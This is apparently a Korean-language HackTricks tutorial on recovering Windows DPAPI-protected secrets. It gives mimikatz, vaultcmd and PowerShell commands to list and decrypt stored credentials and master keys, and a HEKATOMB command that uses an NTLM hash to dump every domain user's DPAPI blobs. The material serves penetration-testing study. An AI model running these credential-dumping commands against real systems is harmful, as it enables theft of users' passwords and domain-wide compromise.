# DPAPI - 비밀번호 추출

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란 무엇인가

데이터 보호 API(DPAPI)는 주로 Windows 운영 체제 내에서 **비대칭 개인 키의 대칭 암호화**에 사용되며, 사용자 또는 시스템 비밀을 중요한 엔트로피 소스로 활용합니다. 이 접근 방식은 개발자가 사용자의 로그인 비밀에서 파생된 키를 사용하여 데이터를 암호화할 수 있게 하여 암호화를 단순화하며, 시스템 암호화의 경우 시스템의 도메인 인증 비밀을 사용하여 개발자가 암호화 키의 보호를 직접 관리할 필요를 없애줍니다.

### DPAPI에 의해 보호되는 데이터

DPAPI에 의해 보호되는 개인 데이터는 다음과 같습니다:

- Internet Explorer 및 Google Chrome의 비밀번호 및 자동 완성 데이터
- Outlook 및 Windows Mail과 같은 애플리케이션의 이메일 및 내부 FTP 계정 비밀번호
- 공유 폴더, 리소스, 무선 네트워크 및 Windows Vault의 비밀번호, 암호화 키 포함
- 원격 데스크톱 연결, .NET Passport 및 다양한 암호화 및 인증 목적을 위한 개인 키의 비밀번호
- Credential Manager에 의해 관리되는 네트워크 비밀번호 및 CryptProtectData를 사용하는 애플리케이션의 개인 데이터, 예를 들어 Skype, MSN 메신저 등

## 목록 금고
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Credential Files

**자격 증명 파일 보호**는 다음 위치에 있을 수 있습니다:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
mimikatz `dpapi::cred`를 사용하여 자격 증명 정보를 가져오면, 응답에서 암호화된 데이터와 guidMasterKey와 같은 흥미로운 정보를 찾을 수 있습니다.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
**mimikatz 모듈** `dpapi::cred`를 적절한 `/masterkey`와 함께 사용하여 복호화할 수 있습니다:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## 마스터 키

사용자의 RSA 키를 암호화하는 데 사용되는 DPAPI 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉토리에 저장되며, 여기서 {SID}는 해당 사용자의 [**보안 식별자**](https://en.wikipedia.org/wiki/Security_Identifier)입니다. **DPAPI 키는 사용자의 개인 키를 보호하는 마스터 키와 동일한 파일에 저장됩니다**. 일반적으로 64바이트의 임의 데이터입니다. (이 디렉토리는 보호되므로 cmd에서 `dir`을 사용하여 나열할 수 없지만 PS에서 나열할 수 있습니다).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
사용자의 마스터 키 모음은 다음과 같습니다:

![](<../../images/image (1121).png>)

일반적으로 **각 마스터 키는 다른 콘텐츠를 복호화할 수 있는 암호화된 대칭 키입니다**. 따라서 **암호화된 마스터 키를 추출하는 것**은 **나중에 그것으로 암호화된 다른 콘텐츠를 복호화하기 위해 흥미롭습니다**.

### 마스터 키 추출 및 복호화

마스터 키를 추출하고 복호화하는 방법에 대한 예시는 [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) 게시물을 확인하세요.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1)는 [@gentilkiwi](https://twitter.com/gentilkiwi)의 [Mimikatz](https://github.com/gentilkiwi/mimikatz/) 프로젝트에서 일부 DPAPI 기능을 C#으로 포팅한 것입니다.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)는 LDAP 디렉토리에서 모든 사용자와 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 작업을 자동화하는 도구입니다. 스크립트는 모든 컴퓨터의 IP 주소를 해결한 후 모든 컴퓨터에서 smbclient를 수행하여 모든 사용자의 DPAPI 블롭을 검색하고 도메인 백업 키로 모든 것을 복호화합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 컴퓨터 목록을 사용하면 알지 못했던 모든 하위 네트워크를 찾을 수 있습니다!

"도메인 관리자 권한만으로는 충분하지 않습니다. 모두 해킹하세요."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI)는 DPAPI로 보호된 비밀을 자동으로 덤프할 수 있습니다.

## References

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
